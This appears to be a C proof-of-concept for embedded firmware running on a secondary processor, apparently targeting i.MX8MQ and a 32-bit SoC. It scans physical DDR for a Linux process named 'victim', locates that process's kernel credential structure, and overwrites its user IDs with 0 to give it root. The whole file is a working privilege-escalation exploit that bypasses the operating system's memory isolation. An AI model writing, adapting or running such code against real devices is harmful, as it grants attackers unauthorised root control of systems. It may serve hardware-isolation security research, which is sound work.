#include <stdio.h>
#include <stdint.h>
#include <string.h>

#ifdef CPU_MIMX8MQ6DVAJZ
const uint64_t kernel_start = 0x40000000;
const uint64_t page_offset =  ((uint64_t)(0xffffffffffffffff) << (47 - 1));
const uint64_t DDR_start = 0x40000000;
const uint64_t DDR_end =   0xC0000000;
typedef uint64_t kerneladdr_t;
#else
const uint64_t kernel_start = 0xC0000000;
const uint64_t page_offset =  0xc0000000;//((uint64_t)(0xffffffffffffffff) << (47 - 1));
const uint64_t DDR_start = 0xC0000000;
const uint64_t DDR_end =   0xE0000000;
typedef uint32_t kerneladdr_t;
#endif

uint32_t virt_to_phys(uint64_t virt) {
  return (virt & ~page_offset) + kernel_start;
}

int is_aligned(uint64_t addr) {
  return (addr & 0x3) == 0;
}

int is_valid_addr(uint64_t phys_addr) {
  return is_aligned(phys_addr) && phys_addr >= DDR_start && phys_addr < DDR_end;
}

void HardFault_Handler() {
  printf("Hard Fault\r\n");

  for(;;);
}

struct cred {
  volatile uint32_t usage; /* refcounter */
  volatile  uint32_t          uid;            /* real UID of the task */
  volatile  uint32_t          gid;            /* real GID of the task */
  volatile  uint32_t          suid;           /* saved UID of the task */
  volatile  uint32_t          sgid;           /* saved GID of the task */
  volatile  uint32_t          euid;           /* effective UID of the task */
  volatile  uint32_t          egid;           /* effective GID of the task */
  volatile  uint32_t          fsuid;
};

void escalate_process(const char* procname) {
#ifdef CPU_MIMX8MQ6DVAJZ
  // enable triggering hard fault on RDC violation
  // IOMUXC_GPR_GPR10
  *(volatile uint32_t *) 0x30340028 |= 0xc;
#endif

  int len = strlen(procname);
  for(uint32_t addr = DDR_start; addr < DDR_end; addr++) {
    if((addr & 0x64fffff) == 0x6400000) {
      printf("AT %lx\r\n", addr);
    }

    int found = 1;
    uint8_t *c = (uint8_t*) addr;
    for(int i = 0; i < len; i++) {
      if(*c != procname[i]) {
        found = 0;
        break;
      }
      c++;
    }

    if(found && is_aligned(addr)) {
      kerneladdr_t cred_virt = *(kerneladdr_t*)(addr - 2 * sizeof(kerneladdr_t));
      uint32_t cred_phys = virt_to_phys(cred_virt);

      if(!is_valid_addr(cred_phys)) {
        printf("addr not valid cred_virt=%llx cred_phys=%lx\r\n", cred_virt, cred_phys);
      } else {
        printf("found cred_virt=%llx cred_phys=%lx\r\n", cred_virt, cred_phys);

        volatile struct cred *real_cred = (volatile struct cred*) cred_phys;
        printf("uid: %lu\r\n", real_cred->uid);

        if(real_cred->uid == 1000) {
          real_cred->uid = 0;
          real_cred->suid = 0;
          real_cred->fsuid = 0;
          real_cred->euid = 0;
          printf("probably found process\r\n");
          return;
        }
      }
    }
  }

  printf("no process found\r\n");
}


int main() {
  printf("=== ROOT ===\r\n");
  escalate_process("victim");
  for(;;);
}
